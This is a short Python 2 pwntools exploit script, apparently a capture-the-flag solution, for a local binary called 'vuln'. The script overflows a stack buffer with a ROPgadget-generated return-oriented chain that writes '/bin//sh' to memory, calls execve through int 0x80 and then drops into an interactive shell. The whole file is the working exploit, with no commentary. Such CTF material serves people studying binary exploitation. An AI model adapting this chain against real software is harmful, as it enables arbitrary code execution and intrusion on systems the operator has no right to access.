#!/usr/bin/env python2
from pwn import *
from struct import pack

padding = 0xffffcf1c-0xffffcf00
payload = 'A'*padding
# execve generated by ROPgadget
# ROPgadget --binary vuln --ropchain --badbytes 0a
payload += pack('<I', 0x0806ee6b) # pop edx ; ret
payload += pack('<I', 0x080da060) # @ .data
payload += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
payload += '/bin'
payload += pack('<I', 0x080da060) # padding without overwrite edx
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806ee6b) # pop edx ; ret
payload += pack('<I', 0x080da064) # @ .data + 4
payload += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
payload += '//sh'
payload += pack('<I', 0x080da064) # padding without overwrite edx
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806ee6b) # pop edx ; ret
payload += pack('<I', 0x080da068) # @ .data + 8
payload += pack('<I', 0x08056420) # xor eax, eax ; ret
payload += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080481c9) # pop ebx ; ret
payload += pack('<I', 0x080da060) # @ .data
payload += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
payload += pack('<I', 0x080da068) # @ .data + 8
payload += pack('<I', 0x080da060) # padding without overwrite ebx
payload += pack('<I', 0x0806ee6b) # pop edx ; ret
payload += pack('<I', 0x080da068) # @ .data + 8
payload += pack('<I', 0x08056420) # xor eax, eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x08049563) # int 0x80

p = process('./vuln')
p.sendlineafter('Can you ROP your way out of this one?', payload)
p.interactive()
